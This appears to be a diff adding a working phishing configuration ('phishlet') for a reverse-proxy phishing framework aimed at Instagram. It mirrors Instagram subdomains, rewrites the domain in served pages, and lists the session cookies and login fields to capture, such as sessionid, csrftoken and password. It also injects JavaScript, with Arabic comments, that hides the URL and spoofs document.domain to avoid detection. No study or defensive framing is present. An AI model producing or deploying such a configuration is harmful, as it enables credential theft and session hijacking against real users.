@@ -1,0 +1,42 @@
+name: 'Instagram'
+target_domain: 'www.instagram.com'
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com' }
+  - { phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com' }
+  - { phish_sub: 'help', orig_sub: 'help', domain: 'instagram.com' }
+  - { phish_sub: 'about', orig_sub: 'about', domain: 'instagram.com' }
+  - { phish_sub: 'blog', orig_sub: 'blog', domain: 'instagram.com' }
+
+sub_filters:
+  - hostname: '{hostname}'
+    sub: 'www'
+    domain: 'instagram.com'
+    search: 'instagram\.com'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']
+
+auth_tokens:
+  - 'sessionid'
+  - 'ds_user_id'
+  - 'csrftoken'
+  - 'rur'
+  - 'mid'
+  - 'ig_did'
+  - 'datr'
+
+creds_fields:
+  - 'username'
+  - 'password'
+  - 'emailOrPhone'
+  - 'enc_password'
+
+auth_urls:
+  - 'https://www.instagram.com/accounts/onetap/?next=%2F'
+  - 'https://www.instagram.com/direct/inbox/'
+  - 'https://www.instagram.com/'
+
+js_inject: |
+  // إخفاء شريط عنوان الموقع
+  window.history.pushState({}, '', window.location.pathname);
+  // منع اكتشاف البروكسي
+  Object.defineProperty(document, 'domain', {value: 'instagram.com'});
